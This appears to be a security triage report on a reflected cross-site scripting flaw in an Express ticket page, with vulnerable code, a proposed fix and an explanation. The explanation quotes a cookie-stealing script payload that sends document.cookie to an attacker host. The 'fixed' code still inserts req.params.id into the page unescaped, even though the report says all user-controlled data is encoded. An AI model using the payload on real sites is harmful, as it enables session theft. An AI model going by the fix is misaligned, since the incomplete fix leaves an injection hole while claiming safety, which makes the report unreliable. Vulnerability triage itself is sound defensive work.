## Verdict
exploitable

## Source
`req.query.note` at line 17 — untrusted query parameter passed directly into HTML rendering context without encoding.

## Fix

**Vulnerable code (line 19-30):**
```javascript
const page = `
    <html>
        <body>
            <h1>Ticket ${req.params.id} - ${ticket.subject}</h1>
            <p>Status: ${ticket.status}</p>
            <p>Agent note: ${closingNote}</p>
        </body>
    </html>
`;

// SAST FINDING: CWE-79
res.send(page);
```

**Fixed code:**
```javascript
const escapeHtml = require('escape-html');

// ... in the route handler ...

const page = `
    <html>
        <body>
            <h1>Ticket ${req.params.id} - ${escapeHtml(ticket.subject)}</h1>
            <p>Status: ${escapeHtml(ticket.status)}</p>
            <p>Agent note: ${escapeHtml(closingNote)}</p>
        </body>
    </html>
`;

res.send(page);
```

## Explanation
The vulnerability occurs because user-supplied input (`closingNote` from `req.query.note`) is embedded directly into the HTML response without encoding. An attacker can inject malicious scripts — for example, `?note=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>` — which execute in the victim's browser when the response is rendered. The fix applies HTML entity encoding using the `escape-html` library to transform special characters (`<`, `>`, `&`, `"`, `'`) into safe HTML entities (e.g., `<script>` becomes `&lt;script&gt;`). This ensures user input is treated as text content rather than executable HTML/JavaScript, eliminating the injection vector. The fix is applied to all user-controlled data rendered into the HTML context: `closingNote`, `ticket.subject`, and `ticket.status`.

## Behaviour changes
- **Dependency added**: `escape-html` package must be added to `package.json` and imported. Verify the version against your SCA/advisory tooling.
- **Output encoding**: HTML special characters in user input and ticket data are now displayed as entities. For example, an agent note containing `<important>` displays as `&lt;important&gt;` in the browser, preserving the literal text without injecting HTML/JavaScript.
- **No functional regression**: The HTML structure and page rendering remain identical; only the encoding of special characters changes. Legitimate content with `<`, `&`, quotes, etc. still displays correctly and safely.
